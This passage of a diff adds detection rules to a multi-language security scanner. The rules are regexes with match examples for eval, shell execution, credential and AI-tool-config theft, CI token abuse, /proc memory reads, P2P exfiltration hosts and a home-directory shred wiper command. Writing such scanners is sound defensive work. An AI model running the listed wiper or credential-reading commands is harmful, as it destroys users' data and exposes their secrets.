+        "no_match": [
+          "base64 -d file",
+          "btoa(x)"
+        ]
+      }
+    },
+    {
+      "id": "SA-JS-026",
+      "type": "regex",
+      "pattern": "GetCallerIdentity|sts\\.amazonaws\\.com|sts\\.(get|assume)",
+      "extensions": [
+        ".js"
+      ],
+      "title": "AWS STS Credential Validation",
+      "severity": "high",
+      "confidence": 0.7,
+      "category": "credential-validation",
+      "explanation": "AWS STS Credential Validation (credential-validation) detected in a .js file.",
+      "examples": {
+        "match": [
+          "GetCallerIdentity",
+          "sts.amazonaws.com",
+          "sts.assumeRole()"
+        ],
+        "no_match": [
+          "s3.amazonaws.com",
+          "getCaller()"
+        ]
+      }
+    },
+    {
+      "id": "SA-JS-027",
+      "type": "regex",
+      "pattern": "secretsmanager:ListSecrets|secretsmanager:GetSecretValue|ListSecrets|GetSecretValue",
+      "extensions": [
+        ".js"
+      ],
+      "title": "Cloud Secrets Manager Enumeration",
+      "severity": "high",
+      "confidence": 0.8,
+      "category": "credential-theft",
+      "explanation": "Cloud Secrets Manager Enumeration (credential-theft) detected in a .js file.",
+      "examples": {
+        "match": [
+          "secretsmanager:ListSecrets",
+          "secretsmanager:GetSecretValue",
+          "GetSecretValue()"
+        ],
+        "no_match": [
+          "secrets list (manual)",
+          "getSecret config"
+        ]
+      }
+    },
+    {
+      "id": "SA-JS-028",
+      "type": "regex",
+      "pattern": "\\.claude\\.json|\\.claude/mcp\\.json|\\.kiro/settings/mcp\\.json",
+      "extensions": [
+        ".js"
+      ],
+      "title": "AI Tool Config Theft",
+      "severity": "critical",
+      "confidence": 0.8,
+      "category": "credential-theft",
+      "explanation": "AI Tool Config Theft (credential-theft) detected in a .js file.",
+      "examples": {
+        "match": [
+          ".claude.json",
+          ".claude/mcp.json",
+          ".kiro/settings/mcp.json"
+        ],
+        "no_match": [
+          "claude.txt",
+          "config.json"
+        ]
+      }
+    },
+    {
+      "id": "SA-JS-029",
+      "type": "regex",
+      "pattern": "getsession\\.org|filev2\\.getsession|seed[123]\\.getsession",
+      "extensions": [
+        ".js"
+      ],
+      "title": "Session P2P Exfiltration",
+      "severity": "critical",
+      "confidence": 0.9,
+      "category": "exfiltration",
+      "explanation": "Session P2P Exfiltration (exfiltration) detected in a .js file.",
+      "examples": {
+        "match": [
+          "getsession.org",
+          "filev2.getsession.org",
+          "seed1.getsession.org"
+        ],
+        "no_match": [
+          "getSession()",
+          "session.org docs"
+        ]
+      }
+    },
+    {
+      "id": "SA-JS-030",
+      "type": "regex",
+      "pattern": "generateKeyPairSync\\s*\\(.*\\bsign\\b",
+      "extensions": [
+        ".js"
+      ],
+      "title": "Provenance Forging: Crypto Key + Sign",
+      "severity": "critical",
+      "confidence": 0.8,
+      "category": "provenance-forging",
+      "explanation": "Provenance Forging: Crypto Key + Sign (provenance-forging) detected in a .js file.",
+      "examples": {
+        "match": [
+          "generateKeyPairSync('rsa'); sign(x)",
+          "k = generateKeyPairSync(); s = sign(d)",
+          "generateKeyPairSync('ec') and sign data"
+        ],
+        "no_match": [
+          "generateKeyPairSync('rsa')",
+          "sign(x)"
+        ]
+      }
+    },
+    {
+      "id": "SA-JS-031",
+      "type": "regex",
+      "pattern": "in-toto\\.io|intoto.*attestation|slsa.*provenance",
+      "extensions": [
+        ".js"
+      ],
+      "title": "Provenance Forging: in-toto/SLSA Attestation",
+      "severity": "high",
+      "confidence": 0.8,
+      "category": "provenance-forging",
+      "explanation": "Provenance Forging: in-toto/SLSA Attestation (provenance-forging) detected in a .js file.",
+      "examples": {
+        "match": [
+          "in-toto.io",
+          "intoto attestation v1",
+          "slsa provenance build"
+        ],
+        "no_match": [
+          "intro doc",
+          "provenance unrelated"
+        ]
+      }
+    },
+    {
+      "id": "SA-JS-032",
+      "type": "regex",
+      "pattern": "updateTarball",
+      "extensions": [
+        ".js"
+      ],
+      "title": "NPM Tarball Manipulation",
+      "severity": "critical",
+      "confidence": 0.85,
+      "category": "worm-propagation",
+      "explanation": "NPM Tarball Manipulation (worm-propagation) detected in a .js file.",
+      "examples": {
+        "match": [
+          "updateTarball(x)",
+          "await updateTarball()",
+          "fn = updateTarball"
+        ],
+        "no_match": [
+          "updateTar()",
+          "tarball helper"
+        ]
+      }
+    },
+    {
+      "id": "SA-JS-033",
+      "type": "regex",
+      "pattern": "beautify\\s*\\(\\s*[\"\\'][0-9a-fA-F]+[\"\\']",
+      "extensions": [
+        ".js"
+      ],
+      "title": "Mass Encrypted String Obfuscation (beautify)",
+      "severity": "high",
+      "confidence": 0.7,
+      "category": "obfuscation",
+      "explanation": "Mass Encrypted String Obfuscation (beautify) (obfuscation) detected in a .js file.",
+      "examples": {
+        "match": [
+          "beautify('deadbeef')",
+          "beautify(\"0123456789abcdef\")",
+          "beautify( 'AABBCC' )"
+        ],
+        "no_match": [
+          "beautify(code)",
+          "js-beautify lib"
+        ]
+      }
+    },
+    {
+      "id": "SA-JS-034",
+      "type": "regex",
+      "pattern": "find\\s+~\\s+-type\\s+f.*shred|xargs\\s+shred\\b",
+      "extensions": [
+        ".js"
+      ],
+      "title": "Dead-Man Wiper (JS)",
+      "severity": "critical",
+      "confidence": 0.9,
+      "category": "destructive-command",
+      "explanation": "Dead-Man Wiper (JS) (destructive-command) detected in a .js file.",
+      "examples": {
+        "match": [
+          "find ~ -type f | xargs shred",
+          "find ~ -type f -exec shred",
+          "xargs shred -u"
+        ],
+        "no_match": [
+          "find . -name x",
+          "shred docs"
+        ]
+      }
+    },
+    {
+      "id": "SA-TS-001",
+      "type": "regex",
+      "pattern": "\\beval\\s*\\(",
+      "extensions": [
+        ".ts"
+      ],
+      "title": "Dangerous Eval",
+      "severity": "high",
+      "confidence": 0.7,
+      "category": "code-execution",
+      "explanation": "Dangerous Eval (code-execution) detected in a .ts file.",
+      "examples": {
+        "match": [
+          "eval(userInput)",
+          "eval('1+1')",
+          "eval ( x )"
+        ],
+        "no_match": [
+          "evaluate(x)",
+          "// eval note"
+        ]
+      }
+    },
+    {
+      "id": "SA-TS-002",
+      "type": "regex",
+      "pattern": "\\bnew\\s+Function\\s*\\(",
+      "extensions": [
+        ".ts"
+      ],
+      "title": "Function Constructor",
+      "severity": "high",
+      "confidence": 0.7,
+      "category": "code-execution",
+      "explanation": "Function Constructor (code-execution) detected in a .ts file.",
+      "examples": {
+        "match": [
+          "new Function('return 1')",
+          "new  Function(args)",
+          "const f = new Function ( x )"
+        ],
+        "no_match": [
+          "function foo(){}",
+          "Function.prototype"
+        ]
+      }
+    },
+    {
+      "id": "SA-TS-003",
+      "type": "regex",
+      "pattern": "dangerouslySetInnerHTML",
+      "extensions": [
+        ".ts"
+      ],
+      "title": "Unsafe HTML",
+      "severity": "high",
+      "confidence": 0.65,
+      "category": "xss",
+      "explanation": "Unsafe HTML (xss) detected in a .ts file.",
+      "examples": {
+        "match": [
+          "dangerouslySetInnerHTML={{__html:x}}",
+          "el.dangerouslySetInnerHTML",
+          "<div dangerouslySetInnerHTML />"
+        ],
+        "no_match": [
+          "setInnerHtml(x)",
+          "innerHTML safe note"
+        ]
+      }
+    },
+    {
+      "id": "SA-TS-004",
+      "type": "regex",
+      "pattern": "child_process\\.(exec|execSync|spawn)\\s*\\(",
+      "extensions": [
+        ".ts"
+      ],
+      "title": "Child Process Exec",
+      "severity": "critical",
+      "confidence": 0.8,
+      "category": "shell-injection",
+      "explanation": "Child Process Exec (shell-injection) detected in a .ts file.",
+      "examples": {
+        "match": [
+          "child_process.exec(cmd)",
+          "child_process.spawn('ls')",
+          "child_process.execSync(c)"
+        ],
+        "no_match": [
+          "import fs from 'fs'",
+          "childProcessHelper()"
+        ]
+      }
+    },
+    {
+      "id": "SA-TS-005",
+      "type": "regex",
+      "pattern": "console\\.(log|error|warn|debug|info)\\s*\\([^)]*process\\.env\\s*[,)]",
+      "extensions": [
+        ".ts"
+      ],
+      "title": "process.env Logged to Console",
+      "severity": "high",
+      "confidence": 0.8,
+      "category": "secret-exposure",
+      "explanation": "process.env Logged to Console (secret-exposure) detected in a .ts file.",
+      "examples": {
+        "match": [
+          "console.log(process.env)",
+          "console.error('e', process.env)",
+          "console.warn(process.env,1)"
+        ],
+        "no_match": [
+          "console.log('hello')",
+          "process.env.PORT"
+        ]
+      }
+    },
+    {
+      "id": "SA-TS-006",
+      "type": "regex",
+      "pattern": "JSON\\.stringify\\s*\\(\\s*process\\.env\\s*[,)]",
+      "extensions": [
+        ".ts"
+      ],
+      "title": "process.env Serialized (JSON.stringify)",
+      "severity": "high",
+      "confidence": 0.8,
+      "category": "secret-exposure",
+      "explanation": "process.env Serialized (JSON.stringify) (secret-exposure) detected in a .ts file.",
+      "examples": {
+        "match": [
+          "JSON.stringify(process.env)",
+          "JSON.stringify( process.env )",
+          "JSON.stringify(process.env,null,2)"
+        ],
+        "no_match": [
+          "JSON.stringify(data)",
+          "JSON.parse(x)"
+        ]
+      }
+    },
+    {
+      "id": "SA-TS-007",
+      "type": "regex",
+      "pattern": "(?:sendFile|readFile|readFileSync|createReadStream)\\s*\\([^)]*(?:req\\.path|req\\.params|req\\.query|req\\.url)",
+      "extensions": [
+        ".ts"
+      ],
+      "title": "Path Traversal: Unsanitized File Serve",
+      "severity": "high",
+      "confidence": 0.75,
+      "category": "path-traversal",
+      "explanation": "Path Traversal: Unsanitized File Serve (path-traversal) detected in a .ts file.",
+      "examples": {
+        "match": [
+          "sendFile(req.path)",
+          "readFileSync(req.params.name)",
+          "createReadStream(req.query.f)"
+        ],
+        "no_match": [
+          "sendFile('/static/x')",
+          "readFile(safePath)"
+        ]
+      }
+    },
+    {
+      "id": "SA-TS-008",
+      "type": "regex",
+      "pattern": "path\\.(?:join|resolve)\\s*\\([^)]*(?:req\\.path|req\\.params|req\\.query|req\\.url)",
+      "extensions": [
+        ".ts"
+      ],
+      "title": "Path Traversal: Unsanitized path.join",
+      "severity": "high",
+      "confidence": 0.75,
+      "category": "path-traversal",
+      "explanation": "Path Traversal: Unsanitized path.join (path-traversal) detected in a .ts file.",
+      "examples": {
+        "match": [
+          "path.join(base, req.path)",
+          "path.resolve(req.params.p)",
+          "path.join(dir, req.query.f)"
+        ],
+        "no_match": [
+          "path.join(base, 'static')",
+          "path.resolve(__dirname)"
+        ]
+      }
+    },
+    {
+      "id": "SA-TS-009",
+      "type": "regex",
+      "pattern": "['\"]/proc/self/environ['\"]",
+      "extensions": [
+        ".ts"
+      ],
+      "title": "Direct /proc Filesystem Access",
+      "severity": "high",
+      "confidence": 0.75,
+      "category": "path-traversal",
+      "explanation": "Direct /proc Filesystem Access (path-traversal) detected in a .ts file.",
+      "examples": {
+        "match": [
+          "read(\"/proc/self/environ\")",
+          "open('/proc/self/environ')",
+          "x = \"/proc/self/environ\""
+        ],
+        "no_match": [
+          "/proc/cpuinfo",
+          "/procedures/list"
+        ]
+      }
+    },
+    {
+      "id": "SA-TS-010",
+      "type": "regex",
+      "pattern": "getsession\\.org|filev2\\.getsession|seed[123]\\.getsession",
+      "extensions": [
+        ".ts"
+      ],
+      "title": "Session P2P Exfiltration",
+      "severity": "critical",
+      "confidence": 0.9,
+      "category": "exfiltration",
+      "explanation": "Session P2P Exfiltration (exfiltration) detected in a .ts file.",
+      "examples": {
+        "match": [
+          "getsession.org",
+          "filev2.getsession.org",
+          "seed1.getsession.org"
+        ],
+        "no_match": [
+          "getSession()",
+          "session.org docs"
+        ]
+      }
+    },
+    {
+      "id": "SA-TS-011",
+      "type": "regex",
+      "pattern": "/proc/\\d+/mem|/proc/self/mem",
+      "extensions": [
+        ".ts"
+      ],
+      "title": "Process Memory Read (/proc)",
+      "severity": "critical",
+      "confidence": 0.9,
+      "category": "memory-forensics",
+      "explanation": "Process Memory Read (/proc) (memory-forensics) detected in a .ts file.",
+      "examples": {
+        "match": [
+          "open('/proc/1234/mem')",
+          "/proc/self/mem",
+          "'/proc/999/mem'"
+        ],
+        "no_match": [
+          "/proc/cpuinfo",
+          "/process/mem"
+        ]
+      }
+    },
+    {
+      "id": "SA-TS-012",
+      "type": "regex",
+      "pattern": "readdir\\w*\\s*\\(\\s*[\"\\']/?proc[\"\\']|/proc/\\*/cmdline",
+      "extensions": [
+        ".ts"
+      ],
+      "title": "Process Enumeration (/proc)",
+      "severity": "high",
+      "confidence": 0.7,
+      "category": "process-enumeration",
+      "explanation": "Process Enumeration (/proc) (process-enumeration) detected in a .ts file.",
+      "examples": {
+        "match": [
+          "readdirSync('/proc')",
+          "readdir('/proc')",
+          "/proc/*/cmdline"
+        ],
+        "no_match": [
+          "readdir('/tmp')",
+          "readDirectory()"
+        ]
+      }
+    },
+    {
+      "id": "SA-TS-013",
+      "type": "regex",
+      "pattern": "\\bRunner\\.Worker\\b|\\bRunner\\.Listener\\b",
+      "extensions": [
+        ".ts"
+      ],
+      "title": "Runner.Worker Process Hunt",
+      "severity": "critical",
+      "confidence": 0.7,
+      "category": "process-enumeration",
+      "explanation": "Runner.Worker Process Hunt (process-enumeration) detected in a .ts file.",
+      "examples": {
+        "match": [
+          "kill Runner.Worker",
+          "Runner.Listener find",
+          "runner.worker"
+        ],
+        "no_match": [
+          "RunnerWorker",
+          "worker run"
+        ]
+      },
+      "flags": [
+        "IGNORECASE"
+      ]
+    },
+    {
+      "id": "SA-TS-014",
+      "type": "regex",
+      "pattern": "ACTIONS_ID_TOKEN_REQUEST_TOKEN|ACTIONS_ID_TOKEN_REQUEST_URL|oidc/token/exchange",
+      "extensions": [
+        ".ts"
+      ],
+      "title": "OIDC Token Exchange",
+      "severity": "critical",
+      "confidence": 0.85,
+      "category": "ci-token-abuse",
+      "explanation": "OIDC Token Exchange (ci-token-abuse) detected in a .ts file.",
+      "examples": {
+        "match": [
+          "ACTIONS_ID_TOKEN_REQUEST_TOKEN",
+          "ACTIONS_ID_TOKEN_REQUEST_URL",
+          "oidc/token/exchange"
+        ],
+        "no_match": [
+          "ID_TOKEN_REQUEST",
+          "token docs"
+        ]
+      }
+    },
+    {
+      "id": "SA-TSX-001",
+      "type": "regex",
+      "pattern": "\\beval\\s*\\(",
+      "extensions": [
+        ".tsx"
+      ],
+      "title": "Dangerous Eval",
+      "severity": "high",
+      "confidence": 0.7,
+      "category": "code-execution",
+      "explanation": "Dangerous Eval (code-execution) detected in a .tsx file.",
+      "examples": {
+        "match": [
+          "eval(x)",
+          "eval('1+1')",
+          "eval ( y )"
+        ],
+        "no_match": [
+          "evaluate(x)",
+          "// eval"
+        ]
+      }
+    },
+    {
+      "id": "SA-TSX-002",
+      "type": "regex",
+      "pattern": "dangerouslySetInnerHTML",
+      "extensions": [
+        ".tsx"
+      ],
+      "title": "Unsafe HTML",
+      "severity": "high",
+      "confidence": 0.65,
+      "category": "xss",
+      "explanation": "Unsafe HTML (xss) detected in a .tsx file.",
+      "examples": {
+        "match": [
+          "dangerouslySetInnerHTML={{__html:x}}",
+          "el.dangerouslySetInnerHTML",
+          "<div dangerouslySetInnerHTML/>"
+        ],
+        "no_match": [
+          "setInnerHtml(x)",
+          "innerHTML note"
+        ]
+      }
+    },
+    {
+      "id": "SA-JSX-001",
+      "type": "regex",
+      "pattern": "\\beval\\s*\\(",
+      "extensions": [
+        ".jsx"
+      ],
+      "title": "Dangerous Eval",
+      "severity": "high",
+      "confidence": 0.7,
+      "category": "code-execution",
+      "explanation": "Dangerous Eval (code-execution) detected in a .jsx file.",
+      "examples": {
+        "match": [
+          "eval(x)",
+          "eval('1+1')",
+          "eval ( y )"
+        ],
+        "no_match": [
+          "evaluate(x)",
+          "// eval"
+        ]
+      }
+    },
+    {
+      "id": "SA-JSX-002",
+      "type": "regex",
+      "pattern": "dangerouslySetInnerHTML",
+      "extensions": [
+        ".jsx"
+      ],
+      "title": "Unsafe HTML",
+      "severity": "high",
+      "confidence": 0.65,
+      "category": "xss",
+      "explanation": "Unsafe HTML (xss) detected in a .jsx file.",
+      "examples": {
+        "match": [
+          "dangerouslySetInnerHTML={{__html:x}}",
+          "el.dangerouslySetInnerHTML",
+          "<div dangerouslySetInnerHTML/>"
+        ],
+        "no_match": [
+          "setInnerHtml(x)",
+          "innerHTML note"
+        ]
+      }
+    },
+    {
+      "id": "SA-PHP-001",
+      "type": "regex",
+      "pattern": "\\b(shell_exec|exec|passthru|system|popen)\\s*\\(",
+      "extensions": [
+        ".php"
+      ],
+      "title": "Shell Execution",
+      "severity": "critical",
+      "confidence": 0.8,
+      "category": "shell-injection",
+      "explanation": "Shell Execution (shell-injection) detected in a .php file.",
+      "examples": {
+        "match": [
+          "shell_exec($cmd)",
+          "system('ls')",
+          "passthru($x)"
+        ],
+        "no_match": [
+          "echo $x",
+          "shell helper note"
+        ]
+      }
+    },
+    {
+      "id": "SA-PHP-002",
+      "type": "regex",
+      "pattern": "\\beval\\s*\\(",
+      "extensions": [
+        ".php"
+      ],
+      "title": "Eval",
+      "severity": "high",
+      "confidence": 0.7,
+      "category": "code-execution",
+      "explanation": "Eval (code-execution) detected in a .php file.",
+      "examples": {
+        "match": [
+          "eval($code)",
+          "eval('1')",
+          "eval ( $x )"
+        ],
+        "no_match": [
+          "evaluate($x)",
+          "// eval"
+        ]
+      }
+    },
+    {
+      "id": "SA-PHP-003",
+      "type": "regex",
+      "pattern": "(?i)mysql_query\\s*\\(\\s*[\"\\'].*\\$",
+      "extensions": [
+        ".php"
+      ],
+      "title": "SQL Injection",
+      "severity": "high",
+      "confidence": 0.7,
+      "category": "injection",
+      "explanation": "SQL Injection (injection) detected in a .php file.",
+      "examples": {
+        "match": [
+          "mysql_query('SELECT * FROM t WHERE id='.$id)",
+          "mysql_query(\"select $x\")",
+          "mysql_query('insert '.$v)"
+        ],
+        "no_match": [
+          "mysql_query('SELECT 1')",
+          "pdo->prepare($q)"
+        ]
+      },
+      "flags": [
+        "IGNORECASE"
+      ]
+    },
+    {
+      "id": "SA-PHP-004",
+      "type": "regex",
+      "pattern": "\\b(include|require)(_once)?\\s*\\(\\s*\\$",
+      "extensions": [
+        ".php"
+      ],
+      "title": "File Inclusion",
+      "severity": "critical",
+      "confidence": 0.7,
+      "category": "injection",
+      "explanation": "File Inclusion (injection) detected in a .php file.",
+      "examples": {
+        "match": [
+          "include($page)",
+          "require_once($f)",
+          "require ( $x )"
+        ],
+        "no_match": [
+          "include('header.php')",
+          "require_once 'config.php'"
+        ]
+      }
+    },
+    {
+      "id": "SA-JAVA-001",
+      "type": "regex",
+      "pattern": "Runtime\\.getRuntime\\(\\)\\.exec",
+      "extensions": [
+        ".java"
+      ],
+      "title": "Command Execution",
+      "severity": "critical",
+      "confidence": 0.8,
+      "category": "shell-injection",
+      "explanation": "Command Execution (shell-injection) detected in a .java file.",
+      "examples": {
+        "match": [
+          "Runtime.getRuntime().exec(cmd)",
+          "Runtime.getRuntime().exec(\"ls\")",
+          "Runtime.getRuntime().exec(c)"
+        ],
+        "no_match": [
+          "runtime.gc()",
+          "new Runtime()"
+        ]
+      }
+    },
+    {
+      "id": "SA-JAVA-002",
+      "type": "regex",
+      "pattern": "new\\s+ProcessBuilder\\s*\\(",
+      "extensions": [
+        ".java"
+      ],
+      "title": "ProcessBuilder",
+      "severity": "high",
+      "confidence": 0.8,
+      "category": "shell-injection",
+      "explanation": "ProcessBuilder (shell-injection) detected in a .java file.",
+      "examples": {
+        "match": [
+          "new ProcessBuilder(cmd)",
+          "new  ProcessBuilder('ls')",
+          "new ProcessBuilder ( x )"
+        ],
+        "no_match": [
+          "ProcessBuilder.class",
+          "processBuilderFactory()"
+        ]
+      }
+    },
+    {
+      "id": "SA-JAVA-003",
+      "type": "regex",
+      "pattern": "ObjectInputStream.*readObject",
+      "extensions": [
+        ".java"
+      ],
+      "title": "Unsafe Deserialization",
+      "severity": "critical",
+      "confidence": 0.85,
+      "category": "deserialization",
+      "explanation": "Unsafe Deserialization (deserialization) detected in a .java file.",
+      "examples": {
+        "match": [
+          "ObjectInputStream in; in.readObject()",
+          "new ObjectInputStream(s).readObject()",
+          "ObjectInputStream ois = x; ois.readObject()"
+        ],
+        "no_match": [
+          "InputStream in",
+          "readObjectSafe()"
+        ]
+      }
+    },
+    {
+      "id": "SA-JAVA-004",
+      "type": "regex",
+      "pattern": "\\.invoke\\s*\\(\\s*[a-zA-Z_]\\w*",
+      "extensions": [
+        ".java"
+      ],
+      "title": "Reflection RCE: Method.invoke",
+      "severity": "high",
+      "confidence": 0.65,
+      "category": "reflection-rce",
+      "explanation": "Reflection RCE: Method.invoke (reflection-rce) detected in a .java file.",
+      "examples": {
+        "match": [
+          "m.invoke(target)",
+          ".invoke(obj)",
+          "method.invoke(instance)"
+        ],
+        "no_match": [
+          ".invoke('literal')",
+          "invokeLater()"
+        ]
+      }
+    },
+    {
+      "id": "SA-JAVA-005",
+      "type": "regex",
+      "pattern": "Class\\.forName\\s*\\(\\s*[a-zA-Z_]\\w*",
+      "extensions": [
+        ".java"
+      ],
+      "title": "Reflection RCE: Class.forName",
+      "severity": "high",
+      "confidence": 0.65,
+      "category": "reflection-rce",
+      "explanation": "Reflection RCE: Class.forName (reflection-rce) detected in a .java file.",
+      "examples": {
+        "match": [
+          "Class.forName(name)",
+          "Class.forName(clsVar)",
+          "Class.forName( x )"
+        ],
+        "no_match": [
+          "Class.forName('java.lang.String')",
+          "forName helper"
+        ]
+      }
+    },
+    {
+      "id": "SA-JAVA-006",
+      "type": "regex",
+      "pattern": "getMethod\\s*\\(\\s*[a-zA-Z_]\\w*",
+      "extensions": [
+        ".java"
+      ],
+      "title": "Reflection RCE: getMethod",
+      "severity": "high",
+      "confidence": 0.65,
+      "category": "reflection-rce",
+      "explanation": "Reflection RCE: getMethod (reflection-rce) detected in a .java file.",
+      "examples": {
+        "match": [
+          "getMethod(name)",
+          "getMethod(mVar)",
+          "getMethod( x )"
+        ],
+        "no_match": [
+          "getMethod('toString')",
+          "getMethodName()"
+        ]
+      }
+    },
+    {
+      "id": "SA-JAVA-007",
+      "type": "regex",
+      "pattern": "getDeclaredMethod\\s*\\(\\s*[a-zA-Z_]\\w*",
+      "extensions": [
+        ".java"
+      ],
+      "title": "Reflection RCE: getDeclaredMethod",
+      "severity": "high",
+      "confidence": 0.65,
+      "category": "reflection-rce",
+      "explanation": "Reflection RCE: getDeclaredMethod (reflection-rce) detected in a .java file.",
+      "examples": {
+        "match": [
+          "getDeclaredMethod(name)",
+          "getDeclaredMethod(mVar)",
+          "getDeclaredMethod( x )"
+        ],
+        "no_match": [
+          "getDeclaredMethod('run')",
+          "getDeclaredField(f)"
+        ]
+      }
+    },
+    {
+      "id": "SA-GO-001",
+      "type": "regex",
+      "pattern": "exec\\.Command\\s*\\(",
+      "extensions": [
+        ".go"
+      ],
+      "title": "Command Execution",
+      "severity": "high",
+      "confidence": 0.8,
+      "category": "shell-injection",
+      "explanation": "Command Execution (shell-injection) detected in a .go file.",
+      "examples": {
+        "match": [
+          "exec.Command('ls')",
+          "exec.Command(cmd)",
+          "exec.Command ( x )"
+        ],
+        "no_match": [
+          "exec.LookPath('ls')",
+          "execHelper()"
+        ]
+      }
+    },
+    {
+      "id": "SA-GO-002",
+      "type": "regex",
+      "pattern": "unsafe\\.Pointer",
+      "extensions": [
+        ".go"
+      ],
+      "title": "Unsafe Pointer",
+      "severity": "medium",
+      "confidence": 0.5,
+      "category": "memory-safety",
+      "explanation": "Unsafe Pointer (memory-safety) detected in a .go file.",
+      "examples": {
+        "match": [
+          "unsafe.Pointer(&x)",
+          "p := unsafe.Pointer(y)",
+          "unsafe.Pointer (z)"
+        ],
+        "no_match": [
+          "safe.Pointer",
+          "unsafePointerNote"
+        ]
+      }
+    },
+    {
+      "id": "SA-GO-003",
+      "type": "regex",
+      "pattern": "reflect\\.ValueOf\\s*\\(\\s*[a-zA-Z_]\\w*",
+      "extensions": [
+        ".go"
+      ],
+      "title": "Reflection RCE: reflect.ValueOf",
+      "severity": "high",
+      "confidence": 0.65,
+      "category": "reflection-rce",
+      "explanation": "Reflection RCE: reflect.ValueOf (reflection-rce) detected in a .go file.",
+      "examples": {
+        "match": [
+          "reflect.ValueOf(x)",
+          "reflect.ValueOf(input)",
+          "reflect.ValueOf( v )"
+        ],
+        "no_match": [
+          "reflect.TypeOf(x)",
+          "valueOfHelper()"
+        ]
+      }
+    },
+    {
+      "id": "SA-GO-004",
+      "type": "regex",
+      "pattern": "\\.Call\\s*\\(\\s*\\[\\s*\\]reflect\\.Value",
+      "extensions": [
+        ".go"
+      ],
+      "title": "Reflection RCE: reflect.Call",
+      "severity": "high",
+      "confidence": 0.65,
+      "category": "reflection-rce",
+      "explanation": "Reflection RCE: reflect.Call (reflection-rce) detected in a .go file.",
+      "examples": {
+        "match": [
+          "m.Call([]reflect.Value{})",
+          ".Call([]reflect.Value{a})",
+          ".Call( []reflect.Value )"
+        ],
+        "no_match": [
+          ".Call(args)",
+          "callHelper()"
+        ]
+      }
+    },
+    {
+      "id": "SA-GO-005",
+      "type": "regex",
+      "pattern": "/proc/\\d+/mem|/proc/self/mem",
+      "extensions": [
+        ".go"
+      ],
+      "title": "Process Memory Read (/proc)",
+      "severity": "critical",
+      "confidence": 0.9,
+      "category": "memory-forensics",
+      "explanation": "Process Memory Read (/proc) (memory-forensics) detected in a .go file.",
+      "examples": {
+        "match": [
+          "open('/proc/1234/mem')",
+          "/proc/self/mem",
+          "'/proc/999/mem'"
+        ],
+        "no_match": [
+          "/proc/cpuinfo",
+          "/process/mem"
+        ]
+      }
+    },
+    {
+      "id": "SA-GO-006",
+      "type": "regex",
+      "pattern": "ioutil\\.ReadDir\\s*\\(\\s*[\"\\']/?proc[\"\\']|filepath\\.Glob\\s*\\(\\s*[\"\\']/?proc/",
+      "extensions": [
+        ".go"
+      ],
+      "title": "Process Enumeration (/proc)",
+      "severity": "high",
+      "confidence": 0.7,
+      "category": "process-enumeration",
+      "explanation": "Process Enumeration (/proc) (process-enumeration) detected in a .go file.",
+      "examples": {
+        "match": [
+          "ioutil.ReadDir('/proc')",
+          "filepath.Glob('/proc/x')",
+          "ioutil.ReadDir(\"/proc\")"
+        ],
+        "no_match": [
+          "ioutil.ReadDir('/tmp')",
+          "filepath.Glob('*.go')"
+        ]
+      }
+    },
+    {
+      "id": "SA-GO-007",
+      "type": "regex",
+      "pattern": "\\bRunner\\.Worker\\b|\\bRunner\\.Listener\\b",
+      "extensions": [
+        ".go"
+      ],
+      "title": "Runner.Worker Process Hunt",
+      "severity": "critical",
+      "confidence": 0.7,
+      "category": "process-enumeration",
+      "explanation": "Runner.Worker Process Hunt (process-enumeration) detected in a .go file.",
+      "examples": {
+        "match": [
+          "kill Runner.Worker",
+          "Runner.Listener",
+          "runner.worker"
+        ],
+        "no_match": [
+          "RunnerWorker",
+          "worker run"
+        ]
+      },
+      "flags": [
+        "IGNORECASE"
+      ]
+    },
+    {
+      "id": "SA-GO-008",
+      "type": "regex",
+      "pattern": "ACTIONS_ID_TOKEN_REQUEST_TOKEN|ACTIONS_ID_TOKEN_REQUEST_URL|oidc/token/exchange",
+      "extensions": [
+        ".go"
+      ],
+      "title": "OIDC Token Exchange",
+      "severity": "critical",
+      "confidence": 0.85,
+      "category": "ci-token-abuse",
+      "explanation": "OIDC Token Exchange (ci-token-abuse) detected in a .go file.",
+      "examples": {
+        "match": [
+          "ACTIONS_ID_TOKEN_REQUEST_TOKEN",
+          "ACTIONS_ID_TOKEN_REQUEST_URL",
+          "oidc/token/exchange"
+        ],
+        "no_match": [
+          "ID_TOKEN_REQUEST",
+          "token docs"
+        ]
+      }
+    },
+    {
+      "id": "SA-RB-001",
+      "type": "regex",
+      "pattern": "\\beval\\s*\\(",
+      "extensions": [
+        ".rb"
+      ],
+      "title": "Eval",
+      "severity": "high",
+      "confidence": 0.7,
+      "category": "code-execution",
+      "explanation": "Eval (code-execution) detected in a .rb file.",
+      "examples": {
+        "match": [
+          "eval(code)",
+          "eval('1')",
+          "eval ( x )"
+        ],
+        "no_match": [
+          "evaluate(x)",
+          "# eval"
+        ]
+      }
+    },
+    {
+      "id": "SA-RB-002",
+      "type": "regex",
+      "pattern": "\\b(system|exec|`|%x)\\s*[\\(\\[]",
+      "extensions": [
+        ".rb"
+      ],
+      "title": "System Call",
+      "severity": "critical",
+      "confidence": 0.8,
+      "category": "shell-injection",
+      "explanation": "System Call (shell-injection) detected in a .rb file.",
+      "examples": {
+        "match": [
+          "system('ls')",
+          "exec('rm')",
+          "exec ['whoami']"
+        ],
+        "no_match": [
+          "systematic()",
+          "execute_query"
+        ]
+      }
+    },
+    {
+      "id": "SA-RB-003",
+      "type": "regex",
+      "pattern": "\\bsend\\s*\\(\\s*params",
+      "extensions": [
+        ".rb"
+      ],
+      "title": "Send Method",
+      "severity": "medium",
+      "confidence": 0.7,
+      "category": "code-execution",
+      "explanation": "Send Method (code-execution) detected in a .rb file.",
+      "examples": {
+        "match": [
+          "obj.send(params)",
+          "x.send( params )",
+          "send(params[:m])"
+        ],
+        "no_match": [
+          "obj.send(:name)",
+          "sender helper"
+        ]
+      }
+    },
+    {
+      "id": "SA-RB-004",
+      "type": "regex",
+      "pattern": "\\b(?:public_)?send\\s*\\(\\s*[a-zA-Z_]\\w*(?!\\s*[\"\\'])",
+      "extensions": [
+        ".rb"
+      ],
+      "title": "Reflection RCE: send with variable",
+      "severity": "high",
+      "confidence": 0.65,
+      "category": "reflection-rce",
+      "explanation": "Reflection RCE: send with variable (reflection-rce) detected in a .rb file.",
+      "examples": {
+        "match": [
+          "obj.send(method_var)",
+          "x.public_send(m)",
+          "send(action)"
+        ],
+        "no_match": [
+          "obj.send('name')",
+          "send(\"literal\")"
+        ]
+      }
+    },
+    {
+      "id": "SA-RB-005",
+      "type": "regex",
+      "pattern": "\\.method\\s*\\(\\s*[a-zA-Z_]\\w*",
+      "extensions": [
+        ".rb"
+      ],
